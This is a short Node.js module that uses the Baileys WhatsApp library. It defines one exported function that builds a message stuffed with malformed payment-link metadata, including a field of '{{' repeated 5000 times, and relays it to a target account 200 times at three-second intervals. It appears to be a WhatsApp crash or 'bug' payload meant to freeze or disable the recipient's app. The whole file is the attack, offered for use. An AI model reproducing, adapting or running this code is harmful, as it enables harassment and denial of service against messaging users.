

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function xbetainvis(SYxS7, target) {
    const msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "",
            matchedText: "https://t.me/kashmiri1_1",
            description: "",
            title: "",
            paymentLinkMetadata: {
                button: { displayText: "" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(5000) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(5000) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    }, {
        additionalAttributes: { edit: "7" }
    });

    const ms = 3; 
    const total = 200;

    for (let i = 0; i < total; i++) {
        try {
            await SYxS7.relayMessage(target, {
                groupStatusMessageV2: {
                    message: msg.message
                }
            }, { 
                messageId: null 
            });
            
            if (i < total - 1) {
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }
            
        } catch (error) {
            console.log(`[ 🗑️ ] Error on message ${i + 1}: ${error.message}`);
            
            if (i < total - 1) {
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }
        }
    }
}


module.exports = { xbetainvis };


